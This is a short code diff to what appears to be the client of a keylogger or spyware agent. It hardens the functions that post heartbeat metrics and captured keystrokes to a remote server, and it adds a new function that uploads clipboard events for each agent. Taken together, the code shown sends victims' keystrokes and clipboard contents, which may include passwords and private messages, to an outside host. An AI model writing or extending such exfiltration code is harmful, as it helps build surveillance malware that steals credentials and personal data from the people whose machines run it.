@@ -14,7 +14,9 @@ def send_metrics(agent_id, data):
     """
     Send heartbeat metrics to the server.
     """
-    requests.post(f"{SERVER_URL}/metrics/{agent_id}", json=data)
+    r = requests.post(f"{SERVER_URL}/metrics/{agent_id}", json=data)
+    
+    r.raise_for_status()
 
 def send_keylogs(agent_id, logs):
     """
@@ -23,6 +25,18 @@ def send_keylogs(agent_id, logs):
     r = requests.post(
         f"{SERVER_URL}/keylogs/{agent_id}",
         json={"events": logs},
+        timeout=5
+    )
+
+    r.raise_for_status()
+
+def send_clipboards(agent_id, events):
+    """
+    Send clipboard events to the server.
+    """
+    r = requests.post(
+        f"{SERVER_URL}/clipboards/{agent_id}",
+        json={"events": events},
         timeout=5
     )
 
